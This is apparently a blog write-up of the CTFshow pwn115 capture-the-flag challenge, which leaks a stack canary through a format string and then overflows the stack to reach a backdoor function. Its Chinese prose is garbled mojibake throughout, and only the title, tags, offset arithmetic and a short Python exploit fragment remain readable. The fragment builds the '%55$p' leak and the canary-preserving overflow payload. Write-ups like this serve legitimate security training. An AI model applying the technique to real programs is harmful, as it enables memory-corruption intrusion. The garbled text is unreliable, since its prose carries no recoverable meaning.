---
title: CTFshow pwn115 鏍煎紡鍖栧瓧绗︿覆娉勯湶 Canary
published: 2026-04-17
updated: 2026-04-17
description: 鍏堢敤鏍煎紡鍖栧瓧绗︿覆鎶?canary 璇诲嚭鏉ワ紝鍐嶆瀯閫犳爣鍑嗙殑鏍堟孩鍑鸿繑鍥炲悗闂ㄣ€
tags: [CTFshow, Pwn, Stack, Canary, Format String]
category: ctfshow
draft: false
---

# 棰樼洰缁撹

杩欓鏄€滄牸寮忓寲瀛楃涓叉硠闇?+ 鏍堟孩鍑哄鐢ㄢ€濈殑鏍囧噯缁勫悎銆?
鍓嶅崐娈靛厛鐢?`%p` 鎵惧埌 canary 鍦ㄦ爤涓婄殑鍋忕Щ锛屽悗鍗婃鎸夋甯告孩鍑烘柟寮忔妸 canary 鍘熷€煎甫鍥炲幓锛屽氨鍙互瀹夊叏鏀硅繑鍥炲湴鍧€銆?
## 鍋忕Щ璁＄畻

鍘熷绗旇缁欏嚭鐨勮绠楁柟寮忔槸锛?
```text
(0xD4 - 0xC) / 4 + 5 = 55
```

鎵€浠ユ渶缁堢敤 `%55$p` 鍘昏 canary銆?
## 鍏抽敭 exp 鐗囨

```python
Leak = b'aaaa' + b'%55$p'
p.sendlineafter("Try Bypass Me!", Leak)
p.recvuntil(b'aaaa0x')
canary = int(p.recv(8), 16)
payload = b'a' * (0xd4 - 0xc) + p32(canary) + b'a' * 0xc + p32(backdoor)
```

## 涓嬭浇

- [涓嬭浇棰樼洰闄勪欢 `pwn`](../../attachments/ctfshow/pwn115/pwn)
- [涓嬭浇鍒╃敤鑴氭湰 `exp.py`](../../attachments/ctfshow/pwn115/exp.py)
- [涓嬭浇鍘熷绗旇 `Bypass_pwn115.md`](../../attachments/ctfshow/pwn115/Bypass_pwn115.md)

## 閫傚悎璁颁綇鐨勭偣

鏈夋牸寮忓寲瀛楃涓叉椂锛屼紭鍏堟兂涓や欢浜嬶細

- 鑳戒笉鑳藉厛 leak canary
- 鑳戒笉鑳藉啀 leak libc / 鏍堝湴鍧€

杩欑被棰樺線寰€涓嶆槸鎶婃牸寮忓寲瀛楃涓插綋鏈€缁堟鍣紝鑰屾槸鎶婂畠褰撯€滃墠缃儏鎶ユ敹闆嗗櫒鈥濄€?

